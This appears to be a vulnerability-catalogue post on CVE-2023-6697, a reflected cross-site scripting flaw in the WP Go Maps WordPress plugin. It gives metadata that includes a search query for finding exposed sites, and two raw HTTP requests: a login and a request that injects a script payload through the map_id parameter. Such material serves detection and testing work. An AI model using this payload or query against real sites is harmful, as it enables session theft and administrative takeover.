---
layout: post
cve_id: CVE-2023-6697
title: WP Go Maps (formerly WP Google Maps) < 9.0.29 - Cross-Site Scripting
pcap: true
pcap_path: /pcaps/2023/CVE-2023-6697.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-6697.yaml
snort2_rule: N/A
snort3_rule: N/A
author: iamnoooob,ritikchaddha
severity: medium
impact: 'Authenticated users can inject malicious JavaScript via reflected XSS in
  the map_id parameter, potentially stealing administrator session cookies or performing
  administrative actions.

  '
remediation: 'Update WP Go Maps plugin to version 9.0.29 or later.

  '
reference:
- https://wpscan.com/vulnerability/ffcebd9d-82fe-4a30-8ad6-cf6c03753d4c/
- https://nvd.nist.gov/vuln/detail/CVE-2023-6697
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 6.1
  cve-id: CVE-2023-6697
  cwe-id: CWE-79
  epss-score: 0.48648
  epss-percentile: 0.97651
  cpe: cpe:2.3:a:wpgmaps:wp_go_maps:*:*:*:*:*:wordpress:*:*
metadata:
  verified: true
  max-request: 2
  fofa-query: body="/wp-content/plugins/wp-google-maps"
  vendor: wpgmaps
  product: wp_go_maps
tags:
- cve
- cve2023
- wp
- wp-plugin
- wordpress
- xss
- wp-go-maps
- authenticated
- vuln
---

## ðŸ” Vulnerability Description
The WP Go Maps (formerly WP Google Maps) plugin for WordPress is vulnerable to Reflected Cross-Site Scripting via the map id parameter in all versions up to, and including, 9.0.28 due to insufficient input sanitization and output escaping. This makes it possible for unauthenticated attackers to inject arbitrary web scripts in pages that execute if they can successfully trick a user into performing an action such as clicking on a link.


## ðŸŒ HTTP Request
```nohighlight
POST /wp-login.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763
Connection: close
Content-Length: 51
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

log=wavl2W&pwd=y8RuqA&wp-submit=Log+In&testcookie=1
```

```nohighlight
GET /wp-admin/admin.php?page=wp-google-maps-menu&action=edit&map_id=1aa%27\"><img+src%3Dx+onerror%3Dalert%28document.domain%29> HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

